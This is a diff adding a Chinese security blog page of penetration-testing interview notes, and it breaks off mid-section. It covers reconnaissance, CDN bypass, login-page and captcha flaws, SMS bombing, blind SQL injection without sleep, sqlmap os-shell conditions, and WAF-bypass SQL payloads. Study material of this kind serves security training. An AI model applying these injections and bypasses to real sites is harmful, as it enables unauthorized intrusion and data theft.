@@ -1,0 +1,881 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>面试题目 | wanan</title><meta name="keywords" content="面试"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="获取目标站点的绝对路径 如果是iis系统,尝试对参数进行恶意传值,使其出现报错页面 对目标网站进行js代码审计,查看是否存在信息泄露出站点的绝对路径 使用字典猜解目标站点的绝对路径 如果目标是thinkphp框架,尝试访问无效的路径,或者对参数进行而已传值使其报错 phpinfo页面泄露站点的绝对路径  怎样进行信息收集 获取目标的真实ip,如果有cdn就绕一下 通过真实去进行半开放的端口扫描,获">
+<meta property="og:type" content="article">
+<meta property="og:title" content="面试题目">
+<meta property="og:url" content="https://www.wanan.red/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95/index.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="获取目标站点的绝对路径 如果是iis系统,尝试对参数进行恶意传值,使其出现报错页面 对目标网站进行js代码审计,查看是否存在信息泄露出站点的绝对路径 使用字典猜解目标站点的绝对路径 如果目标是thinkphp框架,尝试访问无效的路径,或者对参数进行而已传值使其报错 phpinfo页面泄露站点的绝对路径  怎样进行信息收集 获取目标的真实ip,如果有cdn就绕一下 通过真实去进行半开放的端口扫描,获">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg">
+<meta property="article:published_time" content="2022-08-30T06:10:59.636Z">
+<meta property="article:modified_time" content="2022-08-30T06:38:59.125Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="面试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '面试题目',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-08-30 14:38:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">82</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">66</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">面试题目</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-30T06:10:59.636Z" title="发表于 2022-08-30 14:10:59">2022-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-30T06:38:59.125Z" title="更新于 2022-08-30 14:38:59">2022-08-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%B6%E4%BB%96/">其他</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/">面试题目</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">13.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>53分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="面试题目"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="获取目标站点的绝对路径"><a href="#获取目标站点的绝对路径" class="headerlink" title="获取目标站点的绝对路径"></a>获取目标站点的绝对路径</h1><ol>
+<li>如果是iis系统,尝试对参数进行恶意传值,使其出现报错页面</li>
+<li>对目标网站进行js代码审计,查看是否存在信息泄露出站点的绝对路径</li>
+<li>使用字典猜解目标站点的绝对路径</li>
+<li>如果目标是thinkphp框架,尝试访问无效的路径,或者对参数进行而已传值使其报错</li>
+<li>phpinfo页面泄露站点的绝对路径</li>
+</ol>
+<h1 id="怎样进行信息收集"><a href="#怎样进行信息收集" class="headerlink" title="怎样进行信息收集"></a>怎样进行信息收集</h1><ol>
+<li>获取目标的真实ip,如果有cdn就绕一下</li>
+<li>通过真实去进行半开放的端口扫描,获取目标服务</li>
+<li>通过审计js代码 + jsfinder工具查看是否存在接口泄露可以使我们进一步的利用</li>
+<li>对站点进行指纹识别,查看cms历史漏洞</li>
+<li>通过乌云查找目标的历史漏洞,查看脆弱点</li>
+<li>通过google黑语法搜索目标站点的敏感关键词 如 登录 后台 学号 上传</li>
+<li>通过目录扫描工具扫描目标站点文件,查看是否存在未授权访问文件或者更多的功能点</li>
+<li>通过潮汐 在线子域名 layer子域名挖掘机进行子域名收集</li>
+<li>通过nmap goby对c端进行信息收集</li>
+</ol>
+<h1 id="绕cdn"><a href="#绕cdn" class="headerlink" title="绕cdn"></a>绕cdn</h1><ol>
+<li>通过境外ip去平目标系统</li>
+<li>主动向我方的请求,如发邮件</li>
+<li>获取多个子域名ip对比</li>
+<li>查看dns记录</li>
+<li>通过网络搜索引擎去搜索</li>
+</ol>
+<h1 id="只有一个登录页面如何去测"><a href="#只有一个登录页面如何去测" class="headerlink" title="只有一个登录页面如何去测"></a>只有一个登录页面如何去测</h1><h2 id="测试逻辑漏洞点"><a href="#测试逻辑漏洞点" class="headerlink" title="测试逻辑漏洞点"></a>测试逻辑漏洞点</h2><ol>
+<li>密码找回凡是 发送邮件 手机号是否可用拦截</li>
+<li>登录时是否为前段验证,通过修改http回显包是否可用绕过个</li>
+<li>注册功能是否可用覆盖注册admin,注册页面是否存在二阶注入</li>
+<li>验证码是否可以绕过</li>
+<li>用户名是否可以进行暴力破解</li>
+</ol>
+<h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><ol>
+<li>登录页面是否存在注入漏洞</li>
+<li>注册是否存在</li>
+<li>密码找回处是否存在</li>
+</ol>
+<h2 id="js代码是否存在js接口泄露"><a href="#js代码是否存在js接口泄露" class="headerlink" title="js代码是否存在js接口泄露"></a>js代码是否存在js接口泄露</h2><ol>
+<li>有些功能点屏蔽掉,但是js代码可以看到,通过控制台可以触发</li>
+<li>通过jsfinder查看是否存在可用接口</li>
+<li>通过源码查看是否存在接口泄露</li>
+</ol>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ol>
+<li>探测是否存在未授权访问</li>
+<li>探测二级目录 三级目录</li>
+</ol>
+<h2 id="查看漏洞库是否存在历史漏洞"><a href="#查看漏洞库是否存在历史漏洞" class="headerlink" title="查看漏洞库是否存在历史漏洞"></a>查看漏洞库是否存在历史漏洞</h2><h2 id="提取页面关键词去黑暗引擎搜索"><a href="#提取页面关键词去黑暗引擎搜索" class="headerlink" title="提取页面关键词去黑暗引擎搜索"></a>提取页面关键词去黑暗引擎搜索</h2><h1 id="网站有验证码-能想到哪些功能点来利用-挖漏洞-？"><a href="#网站有验证码-能想到哪些功能点来利用-挖漏洞-？" class="headerlink" title="网站有验证码,能想到哪些功能点来利用(挖漏洞)？"></a>网站有验证码,能想到哪些功能点来利用(挖漏洞)？</h1><h2 id="通用设计缺陷"><a href="#通用设计缺陷" class="headerlink" title="通用设计缺陷"></a>通用设计缺陷</h2><h3 id="验证码无效"><a href="#验证码无效" class="headerlink" title="验证码无效"></a>验证码无效</h3><p>有验证码模块,但是验证模块与业务功能没有关联性,此为无效验证,无论输入什么都正确</p>
+<h3 id="验证码由客户端生成-验证"><a href="#验证码由客户端生成-验证" class="headerlink" title="验证码由客户端生成 验证"></a>验证码由客户端生成 验证</h3><p>验证码由客户端js生成并且仅仅在客户端用js验证,通过抓包查看是否有验证码字段或者是关闭js看能否通过验证.</p>
+<h3 id="验证码有回显"><a href="#验证码有回显" class="headerlink" title="验证码有回显"></a>验证码有回显</h3><p>验证码在html或者cookie中显示,或者输出到response headers的其他字段,可被直接查看</p>
+<h3 id="验证码固定"><a href="#验证码固定" class="headerlink" title="验证码固定"></a>验证码固定</h3><p>也叫验证码重复使用,是指验证码没有设置使用期限,在验证码首次认证成功后没有删除在session中的验证码,使得验证码可以被多次成功验证,从而造成危害.</p>
+<h3 id="验证码可以爆破"><a href="#验证码可以爆破" class="headerlink" title="验证码可以爆破"></a>验证码可以爆破</h3><p>服务端未对验证时间 次数做出限制,存在爆破的可能性,简单的系统存在可以直接爆破的可能性,但是做过一些防护的系统还得进行一些绕过才能进行爆破</p>
+<h3 id="验证码可猜解"><a href="#验证码可猜解" class="headerlink" title="验证码可猜解"></a>验证码可猜解</h3><p>验证码比较简单,可以通过推测猜到有哪些验证吗</p>
+<h3 id="可绕过"><a href="#可绕过" class="headerlink" title="可绕过"></a>可绕过</h3><h2 id="图片验证吗"><a href="#图片验证吗" class="headerlink" title="图片验证吗"></a>图片验证吗</h2><p> burpsuite插件推荐：    </p>
+<pre><code>    xp_captcha：https://github.com/smxiazi/NEW_xp_CAPTCHA
+
+    captcha-kiler：https://github.com/c0ny1/captcha-killer/tags
+
+    reCAPTCHA：https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0
+</code></pre>
+<h2 id="短信验证码"><a href="#短信验证码" class="headerlink" title="短信验证码"></a>短信验证码</h2><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h3><p>没有对发送短信验证码的发送时间 用户 ip做出限制</p>
+<h3 id="任意用户注册"><a href="#任意用户注册" class="headerlink" title="任意用户注册"></a>任意用户注册</h3><h3 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47418965/article/details/121613640">https://blog.csdn.net/m0_47418965/article/details/121613640</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/253833.html">https://www.freebuf.com/vuls/253833.html</a></p>
+<h1 id="IIS搭建的网站如何找漏洞？"><a href="#IIS搭建的网站如何找漏洞？" class="headerlink" title="IIS搭建的网站如何找漏洞？"></a>IIS搭建的网站如何找漏洞？</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ab_bcd/article/details/121157779">https://blog.csdn.net/ab_bcd/article/details/121157779</a></p>
+<h1 id="load-data-local读入表条件"><a href="#load-data-local读入表条件" class="headerlink" title="load data local读入表条件"></a>load data local读入表条件</h1><h2 id="load-data-infile"><a href="#load-data-infile" class="headerlink" title="load data infile"></a>load data infile</h2><p>查看一下local_infile条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &#x27;local_infile&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607133946404.png" alt="image-20220607133946404"></p>
+<p>更改可写,这里要注意,在每一次连接数据库之后都需要重新设置这个值.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global local_infile = 1;</span><br><span class="line">show global variables like &#x27;local_infile&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607134016934.png" alt="image-20220607134016934"></p>
+<p>尝试不用local写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table server (text varchar(160) );</span><br><span class="line">load data infile &#x27;C:\\Users\\14980\\Desktop\\load.txt&#x27; into table  server fields terminated by &#x27;\n&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607134352203.png" alt="image-20220607134352203"></p>
+<p>这是因为在mysql安装的时候限制了导入与导出目录权限,只允许在归定的目录下才能导入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607134514802.png" alt="image-20220607134514802"></p>
+<ul>
+<li>null 表示禁止</li>
+<li>如果value值有文件夹目录,则表示只允许改目录下文件</li>
+<li>如果为空则,表表示不限制目录</li>
+</ul>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607135334737.png" alt="image-20220607135334737"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607135347252.png" alt="image-20220607135347252"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607135548251.png" alt="image-20220607135548251"></p>
+<p>删除</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607135644905.png" alt="image-20220607135644905"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">show global variables like &#x27;local_infile&#x27;;</span><br><span class="line">set global local_infile = 1;</span><br><span class="line">create TABLE local ( text VARCHAR(160));</span><br><span class="line">load data local infile &#x27;D:\\download\\load.txt&#x27; into table local fields terminated by &#x27;\n&#x27; ;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607140409707.png" alt="image-20220607140409707"></p>
+<h1 id="sql注入ban了sleep怎么实现时间盲注"><a href="#sql注入ban了sleep怎么实现时间盲注" class="headerlink" title="sql注入ban了sleep怎么实现时间盲注"></a>sql注入ban了sleep怎么实现时间盲注</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607141224384.png" alt="image-20220607141224384"></p>
+<h2 id="benchmark-重复执行某表达式"><a href="#benchmark-重复执行某表达式" class="headerlink" title="benchmark()重复执行某表达式"></a>benchmark()重复执行某表达式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(t,exp);</span><br><span class="line">select benchmark(count,expr) </span><br><span class="line">//是重复执行count次expr表达式,使处理时间很长,来产生延迟</span><br><span class="line">SELECT benchmark (100000000,md5(&quot;hello&quot;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607141512425.png" alt="image-20220607141512425"></p>
+<h2 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h2><p>笛卡尔积(因为连接表是一个分耗时的过程) A*B&#x3D;(A和B中的每一个元素的组合所组成的集合,就是连接表)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from information_schema.columns A,information_schema.`COLUMNS` B,information_schema.TABLEs C;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607141927121.png" alt="image-20220607141927121"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user A, user B,user C,user D,user E,user F,user G,user H;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607142201106.png" alt="image-20220607142201106"></p>
+<h2 id="get-lock-加锁"><a href="#get-lock-加锁" class="headerlink" title="get_lock 加锁"></a>get_lock 加锁</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_lock(key,timeout); 需要两个连接会话</span><br><span class="line">release_lock(key);  锁是否释放,释放了返回1</span><br><span class="line">is_free_lock(key);	返回当前连接id,表示名称为&quot;xxx&quot;的锁正在被使用</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>key 锁的名称</li>
+<li>timeout 加锁等待时间,时间内未加锁成功则事件回滚</li>
+<li>get_lock 加锁成功返回1</li>
+</ul>
+<p>我们新建两个查询</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607144233615.png" alt="image-20220607144233615"></p>
+<p>先运行这个test 1,在运行这个test 5.</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607144306754.png" alt="image-20220607144306754"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220607144326901.png" alt="image-20220607144326901"></p>
+<p>接着这个控制台,我们改成几就是查询几了.但是这个办法有限制,需要与mysql之间的连接是长连接.原因就是一旦关闭这个初次加锁的控制台,锁就自动断开了.</p>
+<p>在php中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_connect()	脚本一结束,到服务器的连接就被关闭</span><br><span class="line">mysql_pconnect() 打开一个到mysql服务器的持久连接</span><br></pre></td></tr></table></figure>
+
+<h2 id="rlike-regexp-正则匹配"><a href="#rlike-regexp-正则匹配" class="headerlink" title="rlike regexp 正则匹配"></a>rlike regexp 正则匹配</h2><p>不会用,也不太好用<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=789">https://www.cdxy.me/?p=789</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">https://www.cnblogs.com/forforever/p/13019703.html</a></p>
+<h1 id="sqlmap的os-shell原理"><a href="#sqlmap的os-shell原理" class="headerlink" title="sqlmap的os shell原理"></a>sqlmap的os shell原理</h1><p><strong>执行原理</strong></p>
+<p>对于mysql数据库来说,–os-shell的本质就是写入两个shell文件,其中的一个可以让我们用来执行命令,另外一个,如果在网站访问的话可以让我们上传文件.</p>
+<p>写shell的话有两个限制条件,首先,我们需要知道上传文件的两个限制条件,首先我们需要知道网站的绝对路径(我们的shell写到哪里),还需要有导入导出权限.</p>
+<p>导入导出的权限在mysql数据库中是有secure_file_priv参数来控制的,当这个参数的后面为null的时候,表示不允许导入导出,如果为具体文件夹时,表示仅允许在这个文件夹下导入导出,secure_file_priv参数的默认值为null,也就是说,如果管理员没有修改过这个参数后面的数值的话,我们没有办法在5.7以上使用–os-shell</p>
+<ol>
+<li>已知目标站点的绝对路径</li>
+<li>已知目标站点的脚本语言</li>
+<li>当前数据库权限必须是dba sa权限</li>
+<li>网站不查杀木马文件</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xiaoming0/p/13951894.html">https://www.cnblogs.com/Xiaoming0/p/13951894.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/278879.html">https://www.freebuf.com/articles/web/278879.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://plumstar.cn/2022/04/28/sqlmap-os-shell/">https://plumstar.cn/2022/04/28/sqlmap-os-shell/</a></p>
+<h1 id="SQL注入绕waf的方式"><a href="#SQL注入绕waf的方式" class="headerlink" title="SQL注入绕waf的方式"></a>SQL注入绕waf的方式</h1><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>根据waf的固定规则去寻找有没有漏网之鱼.</p>
+<h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><h3 id="架构层绕waf"><a href="#架构层绕waf" class="headerlink" title="架构层绕waf"></a>架构层绕waf</h3><ol>
+<li>用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf</li>
+<li>在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf</li>
+<li>边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入.</li>
+</ol>
+<h3 id="资源限制角度绕过waf"><a href="#资源限制角度绕过waf" class="headerlink" title="资源限制角度绕过waf"></a>资源限制角度绕过waf</h3><p>有的时候,由于数据太大,会导致waf无法将所有的数据都检测完成,这个时候会忽略掉我们带入的sql注入语句,从而绕过,使用post请求,对服务器请求很大资源逃逸sql注入语句</p>
+<h3 id="协议层面绕过waf"><a href="#协议层面绕过waf" class="headerlink" title="协议层面绕过waf"></a>协议层面绕过waf</h3><ol>
+<li><p>基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求</p>
+</li>
+<li><p>文件格式,页面只对Content-Type为application&#x2F;x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart&#x2F;form-data,即可绕过</p>
+</li>
+<li><p>参数污染 有的waf仅对部分内容进行过滤如</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
+
+<p> 这样的参数id&#x3D;1,waf也许仅对前面的 id进行检测,而后面的参数并不做处理</p>
+</li>
+</ol>
+<h3 id="规则层面绕过"><a href="#规则层面绕过" class="headerlink" title="规则层面绕过"></a>规则层面绕过</h3><ol>
+<li><p>首先使用比较特殊的方法进行绕过</p>
+<p> 如果存在注入点,测试waf到底拦截了哪一部分数据,如果是空格,可以尝试<code>/*%!%2f*/</code>,如果是对sql函数进行了过滤,可以尝试 sleep<code>/*%!%2f*/</code></p>
+</li>
+<li><p>常见规则</p>
+</li>
+</ol>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220608163750421.png" alt="image-20220608163750421"></p>
+<p>​    3.缓冲区溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1  and (select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version();//自测成功,继续加油0xA*1000  指的是0XA后面的 &quot;A&quot; 重复1000次一般来说对应用软件构成缓冲区溢出都需要比较大的测试长度这里1000仅供参考,在一些情况下也可以更短</span><br></pre></td></tr></table></figure>
+
+<p>​    4.mysql特性绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.= 等于</span><br><span class="line">：= 赋值</span><br><span class="line">@ @+变量名可直接调用</span><br><span class="line"></span><br><span class="line">select * from users where id=1 union select @test=user(),2,3;//1</span><br><span class="line">select * from users where id=1 union select @test:=user(),2,3;//自测可用,继续加油,root</span><br><span class="line">select * from users where id=1 union select @,2,3;//NULL</span><br></pre></td></tr></table></figure>
+
+<p>​    5.黑魔法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>​    6.内联注释</p>
